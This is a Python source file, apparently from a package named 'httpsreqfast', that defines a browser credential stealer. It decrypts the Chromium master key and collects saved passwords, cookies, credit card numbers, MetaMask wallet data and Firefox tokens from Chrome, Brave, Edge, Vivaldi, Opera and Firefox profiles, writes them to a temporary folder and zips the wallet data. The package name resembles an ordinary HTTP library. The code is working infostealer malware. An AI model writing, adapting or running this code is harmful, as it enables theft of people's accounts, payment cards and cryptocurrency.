import os, json, base64, shutil

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from httpsreqfast.config import *

from httpsreqfast.utils.database import interact_database
from httpsreqfast.utils.file import copy_file


class Browser:
    def __init__(self):
        self.__path = ""
        self.__with_default = 1

        self.__master_key = ""
        self.__browser_path = [
            f"{local}\\Google\\Chrome\\User Data",
            f"{local}\\BraveSoftware\\Brave-Browser\\User Data",
            f"{local}\\Microsoft\\Edge\\User Data",
            f"{local}\\Vivaldi\\User Data",
            f"{roaming}\\Opera Software\\Opera Stable",
            f"{roaming}\\Mozilla\\Firefox\\Profiles"
        ]

        try:
            os.mkdir(temp_folder)
        except:
            pass

    # Key

    def __get_master_key(self):
        try:
            with open(f"{self.__path}\\Local State", "r", encoding="utf-8") as f:
                local_state = f.read()

            local_state_json = json.loads(local_state)
            master_key = base64.b64decode(local_state_json["os_crypt"]["encrypted_key"])
            master_key = CryptUnprotectData(master_key[5:], None, None, None, 0)[1]
        except:
            master_key = 0
        return master_key

    def __generate_cipher(self, iv):
        return AES.new(self.__master_key, AES.MODE_GCM, iv)

    def __decrypt_password(self, encrypted_password):
        try:
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = self.__generate_cipher(iv)
            return cipher.decrypt(payload)[:-16].decode()
        except:
            pass


    # Chromium

    def __get_cookies_chromium(self):
        if self.__with_default:
            cookies_path = f"{self.__path}\\Default\\Network\\Cookies"
        else:
            cookies_path = f"{self.__path}\\Network\\Cookies"

        try:
            response = interact_database(cookies_path, "Cookies.sqlite", "SELECT host_key, name, encrypted_value FROM cookies")

            with open(f"{temp_folder}\\Chromium Cookies.txt", "a") as f:
                if os.path.getsize(f"{temp_folder}\\Chromium Cookies.txt") == 0:
                    f.write(f"{'Domain' : <20}{'Name' : ^25}{'Value' : >20}\n")

                for row in response:
                    domain = row[0]
                    name = row[1]
                    encrypted_cookie = row[2]
                    decrypted_cookie = self.__decrypt_password(encrypted_cookie)

                    if domain != "":
                        f.write(f"{domain : <20}{name : ^20}{decrypted_cookie}\n")
        except:
            pass

    def __get_passwords_chromium(self):
        if self.__with_default:
            passwords_path = f"{self.__path}\\Default\\Login Data"
        else:
            passwords_path = f"{self.__path}\\Login Data"

        try:
            response = interact_database(passwords_path, "Passwords.sqlite", "SELECT action_url, username_value, password_value FROM logins")

            with open(f"{temp_folder}\\Chromium Passwords.txt", "a") as f:
                if os.path.getsize(f"{temp_folder}\\Chromium Passwords.txt") == 0:
                    f.write(f"{'Url' : <20}{'Username' : ^39}{'Password' : >13}\n")
                
                for row in response:
                    url = row[0]
                    username = row[1]
                    password = self.__decrypt_password(row[2])

                    if url != "":
                        f.write(f"{url : <20}{username : ^35}{password : >10}\n")
        except:
            pass

    def __get_credit_cards_chromium(self):
        if self.__with_default:
            credit_cards_path = f"{self.__path}\\Default\\Web Data"
        else:
            credit_cards_path = f"{self.__path}\\Web Data"

        response = interact_database(credit_cards_path, "Chromium CreditCards.sqlite", """SELECT guid, 
                                                                name_on_card, 
                                                                expiration_month, 
                                                                expiration_year, 
                                                                card_number_encrypted, 
                                                                origin, 
                                                                billing_address_id
                                                                FROM credit_cards
        """)
        try:
            with open(f"{temp_folder}\\Chromium CreditCards.txt", "a") as f:
                if os.path.getsize(f"{temp_folder}\\Chromium CreditCards.txt") == 0:
                    f.write(f"{'Name' : <30}{'Expiration Month' : ^15}{'Expiration Year' : ^15}{'Card Number' : ^20}{'Origin' : ^15}{'Billing Address' : >15}\n")
                
                for row in response:
                    name = row[0]
                    exp_month = row[1]
                    exp_year = row[2]
                    card_num = self.__decrypt_password(row[3])
                    origin = row[4]
                    billing_address = row[5]

                    if name != "":
                        f.write(f"{name : <30}{exp_month : ^5}{exp_year : ^5}{card_num : ^20}{origin : ^15}{billing_address : >15}\n")
        except:
            pass

    def __get_metamask_chromium(self, browser_number : int):
        if self.__path == self.__browser_path[0] or self.__path == self.__browser_path[1]  or self.__path == self.__browser_path[3]:
            metamask_path = f"{self.__path}\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"
        elif self.__path == self.__browser_path[2]:
            metamask_path = f"{self.__path}\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"
        else:
            return

        try:
            if not os.path.exists(f"{temp_folder}\\metamask"):
                os.makedirs(f"{temp_folder}\\metamask")

            for file in os.listdir(metamask_path):
                if file.endswith(".log"):
                    copy_file(f"{metamask_path}\\{file}", f"{temp_folder}\\metamask\\{browser_number}.log")
        except:
            pass


    #FireFox

    def _get_tokens_firefox(self, tokens):
        for root, dirs, files in os.walk(self.__browser_path[5]):
            for dir in dirs:
                if os.path.exists(f"{root}\\{dir}\\webappsstore.sqlite"):
                    try:
                        response = interact_database(f"{root}\\{dir}\\webappsstore.sqlite", "webappsstore.sqlite", "SELECT key, value FROM webappsstore2")

                        for row in response:
                            if row[0] == "token":
                                token = row[1].replace('"', "")
                                tokens.append(token)
                    except:
                        pass

    def _main(self):
        try:
            count = 0

            for browser in self.__browser_path:
                count += 1
                self.__with_default = 0 if browser == self.__browser_path[4] else 1
                
                self.__path = browser
                self.__master_key = self.__get_master_key()

                if self.__master_key != 0:
                    self.__get_cookies_chromium()
                    self.__get_passwords_chromium()
                    self.__get_credit_cards_chromium()
                    self.__get_metamask_chromium(count)

            shutil.make_archive(f"{temp_folder}\\metazip", "zip", f"{temp_folder}\\metamask")
        except:
            pass